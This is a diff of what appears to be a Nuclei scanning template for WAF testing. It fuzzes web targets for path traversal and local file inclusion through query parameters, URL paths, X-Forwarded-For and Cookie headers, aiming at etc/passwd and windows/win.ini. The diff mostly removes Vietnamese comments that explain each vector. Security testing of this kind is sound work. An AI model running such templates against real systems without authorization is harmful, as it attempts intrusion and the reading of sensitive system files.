@@ -7,24 +7,20 @@ info:
   tags: waf-test, lfi, traversal, fuzzing
 
 variables:
-  # Trỏ tới siêu kho đạn dược hợp nhất của bạn (Chứa cả Deep_Traversal, DotDotPwn và Directory_traversal)
   payload_list: ../payloads/path_traversal.txt
 
 http:
   - raw:
-      # Kiểu 1: Path Traversal cổ điển nhắm vào Query Parameters
       - |+
         GET /?file={{raw_payloads}}&download={{raw_payloads}} HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
 
-      # Kiểu 2: Lách qua URL Path (WAF rất hay fail ở điểm này khi gặp URL Encoded Path)
       - |+
         GET /{{raw_payloads}} HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
 
-      # Kiểu 3: Đâm qua các Header gián tiếp thường được Backend server lưu xuống disk
       - |+
         GET / HTTP/1.1
         Host: {{Hostname}}
@@ -33,23 +29,15 @@ http:
         X-Forwarded-For: {{raw_payloads}}
         Cookie: session={{raw_payloads}}
 
-    # Load siêu mẻ payload vào bộ đệm
     payloads:
       raw_payloads:
         - "{{payload_list}}"
-
-    # BƯỚC XỬ LÝ MA THUẬT (PREPROCESSOR):
     preprocessors:
       - type: template
         generator:
-          # TH1: Với các file như directory_traversal và dotdotpwn (Nó đã là payload ĐÚNG), ta truyền nguyên bản nó vào biến {{raw_payloads}}
           - replace("{{raw_payloads}}", "{{raw_payloads}}", "{{raw_payloads}}")
-          # TH2: Với các dòng của Deep_Traversal có chứa ngòi nổ "{FILE}", ta đè ngòi nổ bằng Linux File
           - replace("{{raw_payloads}}", "{FILE}", "etc/passwd")
-          # TH3: Đè ngòi nổ "{FILE}" bằng Windows File (Kiểm tra xem WAF có lọc chéo hệ điều hành không)
           - replace("{{raw_payloads}}", "{FILE}", "windows/win.ini")
-
-    # Mode 'cluster' để gửi độc lập từng biến của Preprocessor sinh ra
     attack: clusterbomb
 
     matchers:
